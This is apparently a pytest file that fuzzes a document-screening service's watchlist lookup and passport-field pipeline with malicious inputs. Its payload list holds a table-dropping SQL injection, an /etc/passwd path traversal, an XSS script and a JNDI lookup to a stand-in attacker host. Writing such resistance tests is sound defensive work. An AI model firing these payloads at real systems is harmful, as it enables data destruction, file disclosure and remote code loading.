"""Malicious Input, SQL Injection & Path Traversal Fuzzing for Module 12."""

import pytest
from module6_database_sync.src.interface import database_sync_service
from module7_integration_engine.src.interface import screening_orchestrator
import numpy as np

MALICIOUS_INPUTS = [
    "' OR 1=1; DROP TABLE watchlist; --",
    "../../../../etc/passwd\x00",
    "<script>alert('XSS')</script>",
    "A" * 5000,
    "${jndi:ldap://attacker.com/a}"
]

@pytest.mark.parametrize("payload", MALICIOUS_INPUTS)
def test_sql_injection_and_path_traversal_resistance(payload):
    # Test watchlist lookup with malicious query
    res = database_sync_service.lookup_watchlist(payload)
    assert isinstance(res["is_flagged"], bool)

    # Test M1 override with injection strings
    malicious_m1 = {
        "module": "module1_ocr",
        "status": "SUCCESS",
        "document_type": {"value": "passport", "confidence": 0.98},
        "fields": {
            "passport_number": {"value": payload, "confidence": 0.95},
            "issuing_country": {"value": payload[:3], "confidence": 0.99}
        },
        "mrz": {
            "status": "INVALID",
            "mrz_format": "TD3",
            "lines": [payload[:44], payload[:44]],
            "checksum_valid": False,
            "checks": {"composite": False}
        },
        "visual_mrz_conflicts": []
    }

    doc_img = np.ones((100, 100, 3), dtype=np.uint8) * 200
    res = screening_orchestrator.process_screening(doc_img, extracted_fields_override=malicious_m1)
    assert 0.0 <= res["risk_index"] <= 1.0
